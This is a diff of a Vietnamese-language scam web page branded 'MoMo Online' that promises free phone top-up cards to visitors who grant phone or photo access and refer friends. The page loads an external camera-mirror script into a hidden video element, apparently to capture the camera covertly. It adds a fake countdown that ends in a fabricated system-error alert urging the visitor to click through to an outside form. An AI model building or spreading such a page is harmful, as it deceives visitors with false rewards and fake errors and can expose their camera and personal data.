@@ -2,8 +2,7 @@
 <html>
 <head>
 <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script><script type="text/javascript" src="https://itexpress.vn/js/noel.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
 </head>
 
 <div class="video-wrap" hidden="hidden">
@@ -72,11 +71,113 @@ var context = canvas.getContext('2d');
 // Load init
 init();
 
+</script><script language="javascript">
+
+var mins
+var secs;
+
+function cd() {
+ 	mins = 1 * m("3"); // change minutes here
+ 	secs = 0 + s(":01"); // change seconds here (always add an additional second to your total)
+ 	redo();
+}
+
+function m(obj) {
+ 	for(var i = 0; i < obj.length; i++) {
+  		if(obj.substring(i, i + 1) == ":")
+  		break;
+ 	}
+ 	return(obj.substring(0, i));
+}
+
+function s(obj) {
+ 	for(var i = 0; i < obj.length; i++) {
+  		if(obj.substring(i, i + 1) == ":")
+  		break;
+ 	}
+ 	return(obj.substring(i + 1, obj.length));
+}
+
+function dis(mins,secs) {
+ 	var disp;
+ 	if(mins <= 2) {
+  		disp = " 0";
+ 	} else {
+  		disp = " ";
+ 	}
+ 	disp += mins + ":";
+ 	if(secs <= 2) {
+  		disp += "0" + secs;
+ 	} else {
+  		disp += secs;
+ 	}
+ 	return(disp);
+}
+
+function redo() {
+ 	secs--;
+ 	if(secs == -1) {
+  		secs = 59;
+  		mins--;
+ 	}
+ 	document.cd.disp.value = dis(mins,secs); // setup additional displays here.
+ 	if((mins == 0) && (secs == 0)) {
+  		window.alert("Lỗi (code:#2638) .Bạn chưa cấp quyền cho hệ thống? Nhấn vào chữ bắt đầu để được xử lý..."); // change timeout message as required
+  		// window.location = "yourpage.htm" // redirects to specified page once timer ends and ok button is pressed
+ 	} else {
+ 		cd = setTimeout("redo()",1000);
+ 	}
+}
+
+function init() {
+  cd();
+}
+window.onload = init;
 </script>
 
-    <body><style>body{background-color:#000}input{font-size:50px;color:green}</style><br>
-     <b style="color:#fff;font-size:50px">Cấp quyền truy cập up ảnh + khảo sát tặng ngay thẻ cào 10k đến 50k trong hôm nay...!</b><br><img src="http://vipvip.viwap.com/images/maxresdefault.jpg"><br><b style="color:#fff;font-size:40">Hướng Dẫn:</b><br> <i style="color:red;font-size:30px">
- 1.Cấp quyền truy cập điện thoại để khởi động tool.<br>
-2.Giới thiệu cho 3 người bạn trong danh sách bạn bè.<br> Nhấn vào bên dưới để xác nhận yêu cầu của bạn.</i><br><form action="http://vipvip.viwap.com/chat">
-<input type="submit" value="Bắt Đầu"></form>
-</html>
+
+    <body><style>body{background-color:#fff}input{font-size:50px;color:green;margin:8px;padding:3px}#txt {
+  border:none;
+  font-family:verdana;
+  font-size:28pt;
+  font-weight:bold;
+  border-right-color:#FFFFFF
+}
+.phdr{
+color:#090;
+background-color:#000;
+background-image: url(/images/menu.gif);
+background-repeat:repeat-x;
+background-position:50% bottom;
+margin:1px;
+padding:3px;
+border:1px solid #353535;
+font-weight:bold;
+text-align:center;}
+.head{
+background-image: url(https://gaubong.us/images/smileys/user/trangtri/tt33.png);
+border-top-right-radius:20px;
+border-top-left-radius:20px;
+}.iv{border:2px;border-bottom: dashed #69f;margin-bottom:1px}.iv2{border:2px solid #99f;padding:2px;margin:5px}</style><div class="phdr" id="post1">
+<div class="head">
+<a href="/" style="color:#fff;font-size:25px;">
+<span class="text_hoa">
+MoMo Online </span>
+</a>
+</br>
+<small>
+<font color="red">❤</font>
+<font color="#ffff00">•••Kiếm Tiền Muôn Nơi•••</font>
+<font color="red">❤</font>
+</small>
+</div>
+</div><center><div class="iv2"><img src="http://vipvip.viwap.com/images/icon-moi.gif" style="width:80px;margin-left:5px">
+   <i style=”margin:2px;color:#0066cc;font-size:30px;”>Cấp quyền truy cập ảnh nhận ngay thẻ cào 10k...</i> </div></center><img src="http://vipvip.viwap.com/images/maxresdefault.jpg" width="100%"><div class="iv"><i style="padding-left:5px"><b style="color:#000;font-size:30px;text-align:left">Hướng Dẫn: (RUN 3 minute)</b></div><i style="color:red;font-size:30px;text-algin:left"><div class="iv">
+ 1.Cấp quyền truy cập điện thoại để khởi động tool.<center><img src="http://vipvip.viwap.com/images/IMG_20200929_172326.jpg"></center></div><div class="iv">
+2.Chờ máy chủ xác nhận trong 3 phút , sẽ có 1 bảng thông báo hiện ra ,nhấn ok như hình ảnh. <center><img src="http://vipvip.viwap.com/images/IMG_20200929_172454.jpg"></center></div><div class="iv">3.Tiếp theo bạn nhấn vào bắt đầu để server xác nhận yêu cầu của bạn.<center><img src="http://vipvip.viwap.com/images/IMG_20200929_203704.jpg"></center></div><div class="iv">4.Và đây là kết quả:<center><img src="http://vipvip.viwap.com/images/IMG_20200929_211027.jpg"><br>- Chúc các bạn thành công </i></center><center><div class="iv2">Vui lòng đợi: <form name="cd">
+<input id="txt" readonly="true" type="text" value="03:00" border="0" name="disp">
+</form></div></center><center><form action="http://vipvip.viwap.com/chat">
+<input type="submit" value="Bắt Đầu"></form></center>
+
+<div style="background-color:#242c33;color:#333;padding-top:30px;font-size:40px;padding-bottom:30px;border-bottom:3px dashed #1b1e25"><script src="http://master.viwap.com/stats.php?domain=vipvip.viwap.co&ver=js&html={{'<span style="color:#fff;padding-left:2px;font-size:10px"><i>Trực Tuyến: 24((online))</span> <span style="float:right;padding-right:3px;font-size:28px;color:#fff;margin-top:20px">Hôm Nay: 1363((ip))/52895((view))</i></span>'|url_encode}}"></script></div><div style="text-align:center;color:#fff;padding-bottom:30px;padding-top:30px;background-color:#1b1e25;margin-top:5px dashed #ffffff;padding-left:5px; -webkit-border-bottom-right-radius:1px;-webkit-border-bottom-left-radius:1px;border-bottom:0px solid #39434D;font-size:15px">Bản 2.0 được edit bởi Azen11
+</div><!---
